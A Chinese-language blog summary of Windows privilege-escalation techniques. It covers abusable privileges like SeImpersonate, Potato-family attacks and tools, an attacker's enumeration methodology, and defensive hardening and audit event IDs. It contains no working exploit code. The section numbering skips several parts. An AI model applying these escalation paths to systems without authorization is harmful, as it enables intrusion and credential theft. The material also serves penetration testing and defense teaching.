Windows提权小结

发表于2026-08-23|技术杂项
|总字数:3.8k|阅读时长:15分钟|浏览量:

本文仅供安全研究、授权渗透测试、CTF 竞赛与防御教学使用。未经授权对他人系统实施提权攻击属于违法行为。

引言

Windows 提权（Privilege Escalation）是渗透测试中的核心环节。攻击者获得初始 foothold 后通常只有低权限 shell，需要将权限提升到 NT AUTHORITY\SYSTEM 或本地管理员才能实现凭据窃取、横向移动和持久化控制。

本文将 Windows 提权技术分为六大类，按内核漏洞 → 配置错误 → 特权滥用 → UAC 绕过 → 凭据窃取 → 域环境的逻辑展开，力求分类清晰、覆盖全面。

一、Windows 权限体系基础

理解提权的前提是理解 Windows 的权限模型。

1.1 用户角色

角色 权限级别 说明
SYSTEM 最高 内核级身份，提权的终极目标
Administrator 高 本地管理员，受 UAC 约束
标准用户 中 受 UAC、完整性级别和 ACL 限制
Network Service 低 网络服务账户
Local Service 低 本地服务账户

1.2 完整性级别（Integrity Level）

Medium Integrity 进程无法向 High Integrity 进程写入内存或打开其令牌。

1.3 UAC 机制

管理员登录时 Windows 创建两个令牌：

  • Filtered Token（中等完整性）— 日常操作使用
  • Full Token（高完整性）— 需要提升时使用

UAC 不是安全边界（Security Boundary），微软多次声明其设计目标是提醒管理员，而非阻止恶意代码。

1.4 关键特权

通过 whoami /priv 查看，以下特权可被滥用：

特权 提权方式
SeImpersonatePrivilege Potato 系列攻击，模拟 SYSTEM 令牌
SeDebugPrivilege 附加高权限进程、窃取令牌
SeBackupPrivilege 读取 SAM/SYSTEM 数据库
SeRestorePrivilege 覆盖系统文件或 DLL 劫持
SeTakeOwnershipPrivilege 接管文件/注册表所有权后修改权限
SeLoadDriverPrivilege 加载恶意驱动执行内核代码
SeAssignPrimaryTokenPrivilege 与 SeImpersonate 配合替换进程令牌

IIS 应用池、SQL Server、WinRM、Exchange 等服务账户默认拥有 SeImpersonatePrivilege，是 Potato 攻击的高频目标。

五、特权滥用提权

利用已有特权（主要是 SeImpersonatePrivilege）进行令牌模拟，从服务账户提升到 SYSTEM。

5.1 Potato 攻击核心原理

所有 Potato 攻击共享同一原语：

拥有 SeImpersonatePrivilege 的服务账户，通过强制 SYSTEM 进程向攻击者控制的端点认证，利用模拟权限窃取 SYSTEM 令牌，最终通过 CreateProcessAsUser 创建 SYSTEM 进程。

5.2 Potato 工具演进

PrintSpoofer Print Spooler 管道 Win10/Server 2016+ 现代系统推荐
RoguePotato PrintNotify COM Win10 1809+ 需要辅助机器
SweetPotato DCOM + 管道 通用 统一触发方式
GodPotato 综合 RPC/DCOM 现代系统 兼容性最佳

九、防御与缓解

9.1 最小权限原则

  • 服务账户使用最小权限，避免不必要的 SeImpersonatePrivilege / SeDebugPrivilege
  • 应用池账户不加入本地管理员组
  • 普通用户不加入 Administrators 组
  • 域账户避免拥有本地管理员权限

9.2 服务与注册表加固

  • 服务路径用双引号包围
  • 审计服务二进制和路径权限，移除普通用户写权限
  • 禁用 AlwaysInstallElevated 组策略
  • 审计 HKLM\SYSTEM\CurrentControlSet\Services 键权限
  • 清理 Unattend 文件和配置文件中的明文密码

9.3 补丁管理

  • 保持补丁最新，关注本地提权 CVE
  • 域控制器和客户端同步更新
  • 使用 WSUS 控制部署节奏
  • 高风险服务器建立快速回滚机制

9.4 监控审计

事件 ID 描述 提权相关性
4672 特殊权限分配 检测异常特权授予
4688 进程创建 监控可疑进程
4673 特权服务调用 检测特权滥用
4656 对象句柄请求 审计敏感文件访问
  • 启用进程创建审核
  • 监控 SeImpersonatePrivilege 使用
  • 使用 EDR 检测异常令牌获取
  • 定期审计日志

总结

Windows 提权是多层次技术体系，实战中遵循以下方法论：

  1. 先收集，再利用 — systeminfo、whoami /priv、wmic qfe + WinPEAS 全面收集
  2. 内核优先 — 未打补丁则 Watson/WES 识别漏洞，选择稳定 Exploit
  3. 配置兜底 — 补丁完善时重点查服务路径、注册表权限、计划任务、DLL 搜索路径
  4. 特权利用 — whoami /priv 有 SeImpersonate 则 Potato，有 SeDebug 则进程注入
  5. 域环境特殊路径 — BloodHound 路径分析 + Kerberoasting/AS-REP/PTH

防御核心是最小权限原则和配置加固：定期审计、及时打补丁、启用监控，可有效降低提权风险。
